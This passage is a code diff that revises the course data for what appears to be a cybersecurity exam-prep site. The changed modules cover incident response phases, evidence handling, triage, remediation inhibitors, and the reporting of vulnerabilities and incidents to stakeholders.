+          "Restore: Bring systems and data back from clean backups.",
+          "Verify: Test that systems work and are clean before reconnecting.",
+          "Monitor: Watch closely for signs of the attacker returning.",
+          "Reconnect: Return systems to production in a planned order, starting with the most critical.",
+        ],
+        remember:
+          "Moving back into the repaired house: check the wiring, bring the furniture back in a planned order, and keep a smoke detector close by for the first few weeks.",
+        examTip:
+          "Restoring from clean backups, validating, and returning to production = Recovery. A backup taken after the infection may be infected, so use a known-good point. Increased monitoring after recovery is expected.",
+      },
+      {
+        heading: "Phase 7: Post-Incident Activity",
+        explain:
+          "Learn from the incident so the next one is handled better or prevented.",
+        points: [
+          "Lessons learned meeting: Review what happened, what worked, and what did not, ideally within days of closure.",
+          "Root cause analysis: Identify the underlying cause, not just the symptom.",
+          "Documentation: Final report and updated evidence records.",
+          "Improvement: Update plans, playbooks, controls, and training.",
+        ],
+        remember:
+          "A football team watches the game film after the match. The aim is a better game plan next time, not blaming a player.",
+        examTip:
+          "Lessons learned, RCA, after-action report, and updating the plan = Post-incident. Phase order to memorize: Preparation, Detection, Analysis, Containment, Eradication, Recovery, Post-incident. Questions give a scenario action and ask for the phase, so match the action: isolate = containment, remove malware = eradication, restore = recovery.",
       },
     ],
   },
-
   {
     id: "domain-3-3",
-    title: "Digital Forensics and Evidence Handling",
+    title: "Incident Response Techniques",
     domain: "Domain 3.0",
     domainName: "Incident Response and Management",
     module: "3.3",
-    moduleName: "Digital Forensics Concepts",
+    moduleName: "Incident Response Techniques",
     description:
-      "Evidence collection procedures, chain of custody, memory and disk forensics, log analysis, and preservation techniques.",
-    lastUpdated: "Oct 9, 2026",
+      "Incident response and communication plans, playbooks, roles, training, log management, triage, evidence handling, containment, recovery, and root cause analysis.",
+    lastUpdated: "2026-10-19",
     access: "Premium",
-    icon: Terminal,
-    estimatedTime: "5 hours",
+    icon: Search,
+    estimatedTime: "110 minutes",
     sections: [
       {
         heading: "Developing Plans",
         explain:
-          "Planning for digital forensics involves preparing procedures, tools, and responsibilities before an incident occurs.",
+          "Plans are written and approved before an incident so nobody improvises under pressure.",
         points: [
-          "Incident Response Plan: An incident response plan is a documented set of procedures that outlines how an organization prepares for, detects, responds to, and recovers from security incidents.",
-          "Communication Plan: A communication plan defines how incident-related information will be communicated to employees, management, customers, vendors, and other stakeholders during a security incident."
+          "Incident response plan: The master document that describes how the organization prepares for, detects, responds to, and recovers from incidents, including roles and authority.",
+          "Communication plan: Defines who is told what, by whom, through which channel, and when. It covers staff, management, customers, vendors, legal, and regulators.",
         ],
         remember:
-          "Preparation is key. Have your plan written, reviewed, and tested before an incident strikes. The IR Plan is the master procedure; the Communication Plan controls who gets told what.",
+          "The IR plan is the master procedure for fighting the fire. The communication plan is the list of who gets the phone call, and what you are allowed to say to them.",
         examTip:
-          'Questions about "notifying stakeholders" or "reporting to executives" = Communication Plan. Questions about "procedures for handling" an incident = Incident Response Plan.',
+          "'Notify stakeholders, executives, regulators, or customers' = communication plan. 'Procedures for handling an incident from detection to recovery' = incident response plan. Both must be written and tested BEFORE an incident.",
       },
       {
-        heading: "Creating Playbooks",
+        heading: "Creating Playbooks and Defining Roles",
         explain:
-          "Creating playbooks involves defining step-by-step procedures for handling incidents, ensuring consistency and compliance.",
+          "Playbooks give repeatable steps. Roles make sure someone owns each decision.",
         points: [
-          "Creating Playbooks: Creating playbooks involves developing step-by-step procedures that guide responders through handling specific types of security incidents."
+          "Playbook: Step-by-step procedures for one type of incident (phishing, ransomware, data breach), with decision points and who does what.",
+          "Defining roles: Assigning responsibilities and authority, for example incident commander, analysts, communications lead, legal, and system owners.",
+          "Result: Faster, consistent response and fewer arguments during a crisis.",
         ],
         remember:
-          "Playbooks = the script. They give responders consistent, repeatable steps for a specific type of incident (phishing, ransomware, data breach, etc.).",
+          "A film set: the playbook is the script for one scene, and roles say who plays which part and who the director is. When the cameras roll, everyone already knows their lines.",
         examTip:
-          'Scenarios asking "what should the responder do" or needing "step-by-step procedures for a specific incident type" = Playbook.',
-      },
-      {
-        heading: "Defining Roles",
-        explain:
-          "Defining roles assigns clear responsibilities and authority so nobody is guessing during an incident.",
-        points: [
-          "Defining Roles: Defining roles ensures that each team member understands their responsibilities and authority during incident response activities."
-        ],
-        remember:
-          "Roles = who says their lines. Everyone must know their part, and who has the authority to make decisions, before the incident starts.",
-        examTip:
-          'Scenarios asking "who is responsible" or "who has the authority to decide" = Defining Roles.',
+          "'What should the responder do for a ransomware incident?' = playbook. 'Who has authority to disconnect a production server?' = defined roles. If two teams duplicate work or nobody decides, the roles were not defined.",
       },
       {
         heading: "Performing Training",
         explain:
-          "Regular training ensures responders can execute incident response procedures effectively.",
+          "Plans only work if people have practiced them.",
         points: [
-          "Tabletop: A tabletop exercise is a discussion-based training session where participants review and walk through a simulated incident scenario.",
-          "Simulation: A simulation is a hands-on exercise that allows responders to practice handling realistic security incidents in a controlled environment.",
+          "Tabletop exercise: A discussion-based walkthrough of a simulated incident around a table. Low cost and low risk.",
+          "Simulation: A hands-on exercise in a controlled environment where responders use real tools and procedures on realistic scenarios.",
+          "Output: Gaps found in plans, roles, and tools, which feed back into preparation.",
         ],
         remember:
-          "Tabletop = talking through it. Simulation = doing it for real (but in a safe sandbox). Both are essential.",
+          "Tabletop is talking through the fire drill on paper. Simulation is actually running down the stairs with the alarm sounding. Both find problems before a real fire.",
         examTip:
-          'Questions about "discussion-based training" or "walking through a scenario" = Tabletop. Questions about "hands-on practice" or "controlled environment testing" = Simulation.',
+          "'Discussion-based' or 'walk through a scenario' = tabletop. 'Hands-on practice with real tools' = simulation. A tabletop can include executives and legal; a simulation tests technical skills and tools.",
       },
       {
         heading: "Log Management",
         explain:
-          "Effective log collection and analysis during incidents reveals how the attack unfolded.",
+          "Logs are how you reconstruct what happened. Collecting, correlating, and enriching them turns raw lines into answers.",
         points: [
-          "Log Collection: Log collection is the process of gathering logs from systems, applications, devices, and security tools for monitoring and investigation.",
-          "Log Correlation: Log correlation is the process of analyzing and connecting related events from multiple log sources to identify suspicious activity.",
-          "Log Augmentation and Enrichment: Log augmentation and enrichment involve adding additional context, metadata, or threat intelligence to logs to improve analysis.",
+          "Log collection: Gathering logs from systems, applications, devices, and security tools centrally.",
+          "Log correlation: Connecting related events from different sources to reveal an attack pattern.",
+          "Log augmentation and enrichment: Adding context such as GEO-IP, reputation, asset owner, or threat intelligence to make events easier to judge.",
         ],
         remember:
-          "Collect everything. Correlate to find patterns. Enrich with context to understand meaning.",
+          "A detective collects every witness statement (collection), compares them to find the contradictions (correlation), and then looks up each witness's background (enrichment).",
         examTip:
-          "Collecting raw data = Log Collection. Connecting dots between different sources = Log Correlation. Adding threat intel or IP geolocation = Log Augmentation and Enrichment.",
+          "Gathering raw logs = collection. Connecting events across systems = correlation. Adding GEO-IP or threat intel to an event = augmentation and enrichment. A gap in logs from one system is a blind spot; check that the source is being ingested and time-synced.",
       },
       {
-        heading: "Incident Handling",
+        heading: "Alerts, Triage, and Prioritization",
         explain:
-          "Detecting and categorizing incidents properly ensures critical issues are handled first.",
+          "Teams get far more alerts than they can investigate. Triage sorts them so the most serious get attention first.",
         points: [
-          "Alerts and Notifications: Alerts and notifications inform security personnel when suspicious activity or potential security incidents are detected.",
-          "Triage: Triage is the process of assessing and categorizing incidents based on their urgency, severity, and business impact.",
-          "Establishment of a Timeline: Establishing a timeline involves creating a chronological sequence of events to better understand how an incident occurred.",
-          "Determining Severity and Impact: Determining severity and impact involves evaluating the seriousness of an incident and its effect on systems, data, and business operations.",
-          "Prioritization: Prioritization is the process of ranking incidents according to risk level, impact, and urgency to ensure the most critical issues are addressed first.",
+          "Alerts and notifications: Messages from tools that something suspicious may have happened.",
+          "Triage: Quickly assessing and categorizing incidents by urgency, severity, and business impact.",
+          "Establishment of a timeline: Building a chronological sequence of events to understand how the incident unfolded.",
+          "Determining severity and impact: Evaluating how serious it is and what systems, data, and operations are affected.",
+          "Prioritization: Ranking incidents by risk, impact, and urgency so the most critical are worked first.",
         ],
         remember:
-          "Alert fires. Triage decides which patient is sickest. Timeline shows how it happened. Severity tells you how bad. Prioritization tells you what to fix first.",
+          "An emergency room. Alerts are patients arriving. Triage decides who is sickest. The timeline shows how the injury happened. Severity tells you how bad it is. Prioritization says who is treated first.",
         examTip:
-          'Scenario with multiple incidents = use Triage and Prioritization to determine order. Scenario asking "when did it start" = Establishment of a Timeline. Scenario about "which data was exposed" = Determining Severity and Impact.',
+          "Multiple incidents at once and limited staff = triage and prioritization. 'When did it start and what happened next?' = timeline (needs synchronized logs). 'Which data and systems were exposed?' = determining severity and impact. A server with regulated customer data under active attack outranks a test machine with malware.",
       },
       {
         heading: "Evidence Gathering",
         explain:
-          "Proper evidence handling ensures admissibility in legal proceedings and supports thorough investigations.",
+          "Evidence must be collected so it is trustworthy and, if needed, acceptable in court.",
         points: [
-          "Chain of Custody: Chain of custody is the documented process of tracking evidence from collection to final disposition to ensure accountability and legal admissibility.",
-          "Data Integrity Validation: Data integrity validation is the process of confirming that collected evidence has not been altered, modified, or corrupted.",
-          "Preservation: Preservation is the process of protecting evidence in its original state to support investigations and potential legal proceedings.",
-          "Legal Hold: A legal hold is a requirement to preserve relevant data and evidence because of current or anticipated legal action.",
+          "Chain of custody: Documentation of who collected, handled, stored, and transferred evidence, with dates and times, from collection to disposal.",
+          "Data integrity validation: Proving evidence was not changed, usually by hashing the original and each copy and comparing the hashes.",
+          "Preservation: Protecting evidence in its original state. Work on forensic copies (disk images) and use write blockers so the original is not modified.",
+          "Legal hold: A requirement to preserve relevant data, and stop normal deletion, because of actual or expected legal action.",
+          "Order of volatility: Collect the most fragile data first: CPU registers and cache, then RAM (memory), swap, disk, remote logs, and finally backups and archives.",
         ],
         remember:
-          "Evidence is fragile. Protect it, document who touches it, prove it has not changed, and never let it be deleted.",
+          "A crime scene. Tape it off and write down everyone who enters (chain of custody). Photograph and fingerprint it before touching (hashing). Collect ice cream before the rocks: the melting things first (volatility).",
         examTip:
-          'Questions about "admissible in court" or "tracking who handled evidence" = Chain of Custody. Questions about "proof the file was not modified" = Data Integrity Validation. Questions about "protecting evidence in its original state" = Preservation. Questions about "must not delete data" due to legal action = Legal Hold.',
+          "'Who handled the evidence?' = chain of custody. 'Prove the image matches the original' = hash comparison (integrity validation). 'Do not alter the original' = preservation, write blocker, work on a copy. 'Lawsuit expected, do not delete the emails' = legal hold. Memory before disk because memory disappears at shutdown.",
       },
       {
         heading: "Containment and Escalation",
         explain:
-          "Stopping the attack from spreading and escalating when additional expertise is needed.",
+          "Stop the spread quickly and bring in the right people when the issue is beyond your authority or skill.",
         points: [
-          "Isolating Affected Targets: Isolating affected targets involves separating compromised devices, systems, or accounts from the network to prevent further damage.",
-          "Escalation: Escalation is the process of transferring an incident to higher-level personnel or specialized teams when additional expertise or authority is required.",
+          "Isolating affected targets: Separating compromised devices, accounts, or network segments from the rest of the environment. Methods include EDR isolation, VLAN changes, and disabling accounts.",
+          "Escalation: Passing the incident to higher-level staff or specialist teams when more authority, skill, or resources are needed, or when severity thresholds are met.",
         ],
         remember:
-          "Isolation = build a firewall around the problem. Escalation = call in the specialists or decision makers.",
+          "Isolation builds a firewall around the problem room. Escalation is calling in the fire brigade, or the building owner, when the fire is bigger than you can handle.",
         examTip:
-          "Scenario with compromised system = Isolate it immediately. Scenario needing executive decision or specialized knowledge = Escalate.",
+          "Compromised host that must keep evidence intact = isolate from the network but keep it powered on. A decision that needs executive approval, legal exposure, or a skill the team lacks = escalate. Follow the escalation thresholds in the plan.",
       },
       {
         heading: "Recovery Activities",
         explain:
-          "Returning systems to normal operation after the incident is contained and resolved.",
+          "Return to normal operation only when you are sure the problem is fixed and the systems are clean.",
         points: [
-          "Remediation and Verification: Remediation and verification involve fixing identified security issues and confirming that the corrective actions successfully resolved the problem.",
-          "Release from Isolation: Release from isolation occurs when a previously compromised system is confirmed secure and allowed to reconnect to the production environment.",
-          "Performing Restoration: Performing restoration involves returning systems, services, and data to normal operational status after an incident.",
+          "Remediation and verification: Fix the identified issues, then confirm by testing or rescanning that the fix worked.",
+          "Release from isolation: Reconnect a cleaned system to production only after it is confirmed secure.",
+          "Performing restoration: Return systems, services, and data to normal operation, usually from clean backups, in priority order.",
         ],
         remember:
-          "Fix it. Verify it is fixed. Release it back carefully. Restore everything to normal.",
+          "Fix it, prove it is fixed, let it back in, then switch the lights on. Never let a patient out of quarantine before the test comes back clean.",
         examTip:
-          'Scenario about "fixing the vulnerability" = Remediation. Scenario about "testing before reconnecting" = Verification. Scenario about "reconnecting a cleaned system" = Release from Isolation. Scenario about "resuming normal service" = Restoration.',
+          "'Fixing the vulnerability' = remediation. 'Testing or rescanning to confirm' = verification. 'Reconnecting a cleaned system' = release from isolation. 'Resuming normal service from backups' = restoration. Verification comes before release.",
       },
       {
         heading: "Post-Incident Activities",
         explain:
-          "Learning from incidents and improving defenses prevents future occurrences.",
+          "Find out why it really happened and change something so it does not happen again.",
         points: [
-          "Root Cause Analysis (RCA): Root cause analysis is the process of identifying the underlying cause of an incident to prevent similar incidents from occurring in the future.",
-          "Corrective Action Development: Corrective action development involves creating and implementing improvements to security controls, processes, and procedures based on lessons learned from the incident.",
+          "Root cause analysis (RCA): Finding the underlying cause of the incident, not just the symptom (for example, an unpatched server and no segmentation, not just 'malware').",
+          "Corrective action development: Creating and tracking improvements to controls, processes, and training based on lessons learned.",
         ],
         remember:
-          "RCA finds the root problem, not just the symptom. Corrective actions fix it so it never happens again.",
+          "A doctor who treats a fever and also finds the infection that caused it. RCA finds the infection. Corrective actions are the treatment plan so it does not return.",
         examTip:
-          'Questions about "why did this happen" or "what allowed the attack" = RCA. Questions about "how do we prevent this" or "process improvements" = Corrective Action Development.',
+          "'Why did this happen?' or 'what allowed the attack?' = RCA. 'How do we prevent it next time?' = corrective action development. Symptom answers (the user clicked a link) are weaker than root cause answers (no email filtering or training).",
       },
     ],
   },
-
-
-  // Domain 4.0: Reporting and Communication (16%)
+  // ===================== DOMAIN 4.0 REPORTING AND COMMUNICATION (16%) =====================
   {
     id: "domain-4-1",
-    title: "Reporting Techniques and Report Types",
+    title: "Vulnerability Management Reporting and Communication",
     domain: "Domain 4.0",
     domainName: "Reporting and Communication",
     module: "4.1",
-    moduleName: "Reporting Techniques",
+    moduleName: "Vulnerability Management Reporting",
     description:
-      "Report types and audiences, executive summaries, technical reports, incident reports, vulnerability reports, and risk communication.",
-    lastUpdated: "Oct 9, 2026",
+      "Vulnerability scan reports, compliance findings, risk scorecards, action plans, inhibitors to remediation, stakeholder communication, and vulnerability management KPIs such as trends, top risks, and SLAs.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: FileText,
-    estimatedTime: "2 hours",
+    estimatedTime: "90 minutes",
     sections: [
       {
-        heading: "Report Types and Purposes",
+        heading: "Vulnerability Management Report Types",
         explain:
-          "Different stakeholders need different information. Reports must be tailored to audience and purpose.",
+          "Different readers need different reports. Choosing the right report for the audience is what the exam tests.",
         points: [
-          "Executive report: High-level summary. What happened? Impact? Cost? What did we do? No technical details.",
-          "Technical report: Detailed analysis. Attack vectors, indicators of compromise, forensic findings. For technical team.",
-          "Incident report: What, when, where, who, why, how. Detailed incident description. For documentation.",
-          "Vulnerability report: What is vulnerable? Severity? How to fix? For development and security teams.",
-          "Risk report: Risk ranking. Business impact. Remediation timeline. For management decision-making.",
+          "Vulnerability scan report: Technical output from a scan listing each weakness, the affected host, severity, and suggested fix. Used by security and IT teams to prioritize and track remediation.",
+          "Compliance findings: Results showing whether the organization meets a regulation or standard (PCI DSS, HIPAA, ISO) and where the gaps are. Used by auditors, compliance, and management.",
+          "Risk scorecard: A short summary, often red, amber, and green, that rates risk by area or system. Used by executives to see posture and decide on resources.",
+          "Action plan: Documented steps to fix the findings, including who is responsible, what must be done, and by when.",
         ],
         remember:
-          "Match report complexity to audience knowledge level. Executives want bottom line. Technicians want details.",
+          "A doctor reports differently to three people. The patient's lab results (scan report) are detailed. The insurer gets a checklist of rules met or missed (compliance findings). The hospital board gets a one-page health summary (risk scorecard). The treatment plan says who does what and when (action plan).",
         examTip:
-          'Scenarios asking "who should receive this report" require understanding audience and report type.',
+          "Technical list of findings per host for the patching team = scan report. Gaps against PCI DSS, HIPAA, or ISO for auditors = compliance findings. One-page red, amber, green view for executives = risk scorecard. 'Who fixes what, by when?' = action plan. Scan report = detail, scorecard = summary, compliance findings = gaps against a standard, action plan = the work.",
       },
       {
-        heading: "Executive Communication",
-        explain: "Executives need business impact, not technical details.",
-        points: [
-          "What happened: 1-2 sentence incident description.",
-          "Impact: How much revenue lost? Customers affected? Compliance violation? What is the business damage?",
-          "Cost: Investigation cost? Remediation cost? Lost productivity? Total cost to business.",
-          "Response: What did we do? How fast? What did we fix?",
-          "Future: Will this happen again? What is the plan?",
-        ],
-        remember:
-          "Executives care about risk and cost. Translate technical findings into business impact.",
-      },
-      {
-        heading: "Technical Report Structure",
+        heading: "Action Plans: Escalation and Dependencies",
         explain:
-          "Technical reports provide detailed findings for technical teams.",
+          "An action plan must account for when to escalate and what else depends on the system being fixed.",
         points: [
-          "Executive summary: 1-page summary of findings.",
-          "Methodology: How investigation was conducted. What tools used? Timeline of investigation.",
-          "Findings: Detailed technical findings. Attack vector, malware analysis, timeline, indicators.",
-          "Evidence: Forensic evidence supporting findings. Logs, screenshots, file hashes.",
-          "Recommendations: Specific remediation steps. Priority. Resource requirements.",
+          "Escalation: Raising unresolved or critical vulnerabilities to higher management or specialized teams so they get attention and resources, especially when an SLA deadline is missed or a fix is blocked.",
+          "Dependencies: Systems, applications, or processes that rely on each other. Patching one component can break another that depends on it, so dependencies must be mapped first.",
+          "Planning: Use change windows, test the patch first, prepare a rollback, and tell affected owners in advance.",
         ],
         remember:
-          "Technical reports need detail and evidence. Back every claim with forensic proof.",
+          "Fixing a bridge that many roads connect to. You check which roads depend on it, schedule the closure for a quiet night, and call the mayor if the repair crew is stuck. Fixing without checking dependencies is how you shut down the whole town.",
+        examTip:
+          "A critical flaw is not fixed by its SLA deadline = escalate to management. A patch would take down an app that depends on the server = check dependencies, use a change window, test first, and add compensating controls meanwhile. Patching a database without checking which applications use it is the classic 'what went wrong' scenario.",
       },
       {
-        heading: "Data Visualization and Clarity",
-        explain: "Clear presentation of findings improves understanding.",
+        heading: "Inhibitors to Remediation",
+        explain:
+          "Many things can delay a fix. Recognizing each one tells you what to do next, which is usually a documented exception plus compensating controls.",
         points: [
-          "Timeline diagrams: Visual representation of attack progression.",
-          "Impact summary: Affected systems, users, data in easy-to-scan format.",
-          "Risk heat maps: Visual risk prioritization.",
-          "Before/after: Show security posture improvements.",
+          "Contractual agreements: A contract or SLA with a vendor or customer restricts changes, or requires vendor approval first.",
+          "Organizational governance: Internal policies and approval boards (such as a change advisory board) must approve changes. It gives oversight but can slow action.",
+          "Business process interruption: Applying the fix requires downtime that disrupts critical operations (for example a 24/7 service).",
+          "Degrading functionality: The patch slows the system or removes a feature the business needs.",
+          "Legacy systems: Old or end-of-life systems that no longer get vendor patches.",
+          "Proprietary systems: Custom or vendor-locked systems that only the vendor can change.",
+          "Patch availability: The vendor has not yet released a fix.",
         ],
         remember:
-          "A picture is worth 1000 words. Use visuals to clarify complex findings.",
-      },
-    ],
-    quickReview: [
-      "Executive report: Business impact, cost, response taken. No technical details.",
-      "Technical report: Detailed findings, methodology, evidence, recommendations.",
-      "Match report to audience. Executives = business. Technicians = technical detail.",
-      "Include: Executive summary, findings, evidence, recommendations in technical report.",
-      "Use visuals: Timelines, heat maps, charts to clarify findings.",
-      "Avoid jargon in executive report. Define technical terms in technical report.",
-    ],
-    glossary: [
-      {
-        term: "Executive Summary",
-        meaning:
-          "High-level overview of findings for non-technical stakeholders.",
+          "Why the mechanic cannot fix your car today: the warranty forbids anyone but the dealer (contract), the shop manager must approve the job (governance), you need the car for work (interruption), the repair would make it slower (degrading), the parts are no longer made (legacy), only the maker can open the engine (proprietary), the part has not arrived yet (patch availability).",
+        examTip:
+          "Vendor contract says only the vendor may modify the system = contractual agreement. Change needs committee approval = organizational governance. Fix needs downtime on a 24/7 service = business process interruption. Patch breaks a feature or slows the app = degrading functionality. End-of-life OS = legacy system. Custom or vendor-locked appliance = proprietary system. No vendor fix exists yet = patch availability. Interruption is about DOWNTIME; degrading is about reduced performance or lost features. When blocked, the usual answer is a documented exception plus compensating controls (see Module 2.3).",
       },
       {
-        term: "Forensic Evidence",
-        meaning: "Data proving attack methods and attacker actions.",
+        heading: "Stakeholder Identification and Communication",
+        explain:
+          "Each stakeholder needs different detail. Effective communication gives each audience what they need to act.",
+        points: [
+          "Stakeholder identification: Deciding who needs vulnerability information, such as system owners, IT operations, developers, executives, auditors, and customers.",
+          "System owners and IT operations: Need the list of what to fix and when, with patch details.",
+          "Executives: Need risk, trends, top risks, and decisions required, without technical noise.",
+          "Auditors and compliance: Need evidence of compliance and the status of gaps.",
+        ],
+        remember:
+          "Same facts, different detail for each audience. The mechanic needs the part number, the owner needs the price and the time, the insurer needs the cause. A report that suits everyone usually helps no one.",
+        examTip:
+          "A question asking which report or level of detail goes to which person is testing audience. Technical detail goes to the people who fix; summaries, risk, and trends go to management; evidence goes to auditors. Reporting regularly and to the right people is part of governance.",
       },
       {
-        term: "Risk Ranking",
-        meaning: "Prioritization of risks by severity and business impact.",
-      },
-      {
-        term: "Remediation",
-        meaning: "Actions taken to fix the vulnerability or incident.",
+        heading: "Metrics, KPIs, Trends, Top Risks, and SLAs",
+        explain:
+          "Numbers show whether the vulnerability program is improving and help justify decisions.",
+        points: [
+          "Metrics and KPIs: Measures of program performance, such as open vulnerabilities by severity, percent of assets scanned, SLA compliance, patch coverage, and mean time to remediate.",
+          "Trends: How the numbers change over time. A falling count of critical findings is good; the same vulnerabilities reappearing signals a process problem.",
+          "Top risks: The few most critical vulnerabilities or risk areas that need attention first. Executives want these, not a full scan dump.",
+          "Service-level agreement (SLA): A defined time to fix vulnerabilities by severity, for example Critical in 7 days and High in 30. An SLA is an agreement, often with consequences; an SLO (Module 2.4) is the internal measurable target.",
+        ],
+        remember:
+          "A fitness tracker. KPIs are your steps and heart rate, trends show whether you are improving week by week, top risks are the two things the doctor tells you to fix first, and the SLA is the deadline in the treatment contract.",
+        examTip:
+          "Number of critical findings going down month over month = positive trend. The same vulnerabilities reappearing after patching = configuration or patch management problem. 'Percent of critical vulnerabilities fixed within the agreed time' = SLA compliance. Executives want top risks and trends, not raw scan output.",
       },
     ],
   },
   {
     id: "domain-4-2",
-    title: "Dashboards and Security Metrics",
+    title: "Security Operations and Incident Response Reporting and Communication",
     domain: "Domain 4.0",
     domainName: "Reporting and Communication",
     module: "4.2",
-    moduleName: "Dashboards and Metrics",
+    moduleName: "Incident Response Reporting",
     description:
-      "KPIs, security metrics, trend analysis, data visualization, compliance metrics, and real-time monitoring dashboards.",
-    lastUpdated: "Oct 9, 2026",
+      "Incident declaration and escalation, executive summaries, communication plans and stakeholders, operational security awareness, post-incident reporting, shift handover, internal threat intelligence reports, and SOC metrics.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: BarChart3,
-    estimatedTime: "2 hours",
+    estimatedTime: "100 minutes",
     sections: [
       {
-        heading: "Security KPIs and Metrics",
-        explain: "Quantifiable metrics show security program effectiveness.",
+        heading: "Incident Declaration and Escalation",
+        explain:
+          "Formally declaring an incident starts the official response and makes sure the right people are involved.",
         points: [
-          "Vulnerability metrics: Number discovered, remediation rate, time to patch by severity.",
-          "Detection metrics: Alerts generated, false positive rate, MTTR (Mean Time To Respond).",
-          "Incident metrics: Incidents per month (trending down is good), average dwell time, MTTR.",
-          "Compliance metrics: Percentage of controls implemented, audit findings, compliance trending.",
-          "User metrics: Training completion rate, phishing click rate, policy compliance rate.",
+          "Event vs incident: An event is any observable occurrence. An incident is an event that harms, or threatens to harm, confidentiality, integrity, or availability, or that violates policy.",
+          "Incident declaration: The formal decision that an incident exists. It activates the incident response plan, assigns an owner, and starts the clock for notification duties.",
+          "Escalation: Notifying and involving higher-level management or specialists according to severity and the plan.",
         ],
         remember:
-          "Metrics should trend in positive direction. Increase detection, decrease incidents. Increase training, decrease clicks.",
-      },
-      {
-        heading: "Dashboard Design",
-        explain: "Effective dashboards present key metrics at a glance.",
-        points: [
-          "Executive dashboard: High-level metrics. Overall security posture. Risk trend. Compliance status.",
-          "Operations dashboard: Real-time alerts, current incidents, system health, blocked threats.",
-          "Metrics dashboard: KPI trends over time. Month-over-month comparison. Goal tracking.",
-          "Drill-down capability: Click on metric to see details. Executive dashboard for leaders, operational details for team.",
-        ],
-        remember:
-          "Different roles need different dashboards. Executive vs Technical.",
+          "A smoke alarm is an event. When the fire marshal says 'this is a fire' and calls the brigade, that is the declaration. Declaring an incident is what turns on the sprinklers, the phone tree, and the paperwork.",
         examTip:
-          'Scenarios asking "what should leadership see" point to high-level dashboard vs detailed metrics.',
+          "Something suspicious happened but impact is unknown = event, keep analyzing. Confirmed impact on data or availability = declare an incident and follow the plan. High severity or regulated data involved = escalate to leadership and legal. Delay in declaring can cost you legal notification deadlines.",
       },
       {
-        heading: "Metrics Interpretation and Trending",
+        heading: "Executive Summary and Communication Plan",
         explain:
-          "Raw numbers need context. Trending shows whether security is improving.",
+          "Management needs the essentials quickly, and every incident needs a pre-agreed way to share information.",
         points: [
-          "Baseline: Establish normal baseline. What is expected? Incidents should trend down after improvements.",
-          "Trending: Track metric over time (days, weeks, months). Spike might indicate new threat or new detection.",
-          "Anomalies: Sudden change in metric. Investigate why. New attack? New detection rule? Test?",
-          "Context: Metric alone is meaningless. Budget spent? People hired? Tools implemented? Context explains metric.",
+          "Executive summary: A short, non-technical overview of what happened, the impact, current status, actions taken, and decisions needed.",
+          "Communication plan: A written plan, made before an incident, that sets who is informed, by whom, through which channel, how often, and with what message.",
+          "Consistent messaging: One approved source of truth prevents rumors and conflicting statements.",
         ],
         remember:
-          "Trending is more important than absolute number. Is security posture improving?",
+          "A news flash for the boss: headline first, then impact, then what we are doing, then what we need from you. The communication plan is the contact list and script prepared before the storm.",
+        examTip:
+          "A summary for the CEO or board = executive summary (short, plain language, impact and decisions, no packet captures). 'Who is told what, and when?' = communication plan, prepared beforehand. Technical details belong in the technical report for responders.",
       },
       {
-        heading: "Compliance and Audit Metrics",
-        explain: "Compliance metrics show regulatory requirement fulfillment.",
-        points: [
-          "Control implementation: Percentage of required controls implemented and operating.",
-          "Audit findings: Number, severity, remediation status. Track to closure.",
-          "Assessment results: Periodic audits and assessments. Trend should improve.",
-          "Policy compliance: Percentage of users compliant with security policies.",
-        ],
-        remember:
-          "Compliance metrics often overlap with security metrics. A strong security program meets compliance.",
-      },
-    ],
-    quickReview: [
-      "Key metrics: Vulnerabilities discovered, incidents per month, MTTR, training completion, phishing click rate.",
-      "Executive dashboard: Overall posture, risk trend, compliance status. High-level only.",
-      "Operations dashboard: Real-time alerts, current incidents, system health.",
-      "Trending is critical. Metrics should improve after security improvements.",
-      "Baseline establishes normal. Spike requires investigation (threat or detection change?).",
-      "Compliance metrics show regulatory requirement fulfillment.",
-    ],
-    glossary: [
-      {
-        term: "KPI",
-        meaning:
-          "Key Performance Indicator, quantifiable metric of effectiveness.",
-      },
-      { term: "MTTR", meaning: "Mean Time To Respond or Resolve." },
-      { term: "Baseline", meaning: "Normal expected value for a metric." },
-      { term: "Trending", meaning: "Pattern of metric change over time." },
-    ],
-  },
-  {
-    id: "domain-4-3",
-    title: "Stakeholder Communication and Escalation",
-    domain: "Domain 4.0",
-    domainName: "Reporting and Communication",
-    module: "4.3",
-    moduleName: "Stakeholder Communication",
-    description:
-      "Communicating with technical and non-technical audiences, escalation procedures, risk communication, crisis communication, and audience adaptation.",
-    lastUpdated: "Oct 9, 2026",
-    access: "Free",
-    icon: Users,
-    estimatedTime: "2 hours",
-    sections: [
-      {
-        heading: "Audience-Based Communication",
+        heading: "Incident Communication Stakeholders",
         explain:
-          "Different audiences need different information presented differently.",
+          "Each group has a different role and different legal duties in an incident.",
         points: [
-          "Executive audience: Business impact, cost, risk, timeline. Minimal technical detail.",
-          "IT operations: How to fix, timeline to resolution, business continuity impact.",
-          "Developers: Vulnerability details, reproduction steps, secure coding solution.",
-          "End users: What to do, how to protect yourself, when to report suspicious activity.",
-          "Board of directors: Strategic risk, market impact, competitive advantage, investor confidence.",
+          "Stakeholder identification: Working out who must be informed or consulted for this incident.",
+          "Legal team: Advises on legal duties, liability, contracts, and notification rules, and can protect sensitive discussions through attorney-client privilege.",
+          "Public relations: Manages external messaging to protect reputation and trust.",
+          "Regulatory reporting agencies: Government or industry bodies that may require notice of a breach within a set time (for example GDPR requires notifying the authority within 72 hours in many cases). Always check the current rules that apply.",
+          "Law enforcement: May investigate crimes and help with evidence and attribution. Involving them can affect how evidence must be handled.",
+          "Customers: People or organizations whose data or service is affected and who may need notice so they can protect themselves.",
         ],
         remember:
-          "Tailor message to what audience cares about. Executives care about risk/cost. Developers care about how to fix.",
+          "A burglary at a bank: the lawyer says what the bank must legally do, the PR person writes what to tell the public, the regulator needs a report by a deadline, the police investigate the crime, and customers need to know whether their money is safe.",
+        examTip:
+          "Legal duties, privilege, or liability = legal team (involve them early). Press statements and brand reputation = public relations. Breach notification deadlines = regulatory reporting agencies. Criminal activity, evidence, or attribution = law enforcement. Customers whose data was exposed = customer notification. Technical details go to responders, not to PR or customers.",
       },
       {
-        heading: "Escalation Procedures",
+        heading: "Operational Security Awareness and Communication Channels",
         explain:
-          "Clear escalation ensures incident severity gets appropriate attention.",
+          "During an incident, how you communicate matters as much as what you say. An attacker may be reading your email.",
         points: [
-          "Severity levels: Define what triggers escalation. Loss of service? Sensitive data? Executive notification required?",
-          "Escalation path: Who do you tell? When? Chain of command matters.",
-          "Timing: Escalate immediately on serious issues. Do not delay hoping to fix it.",
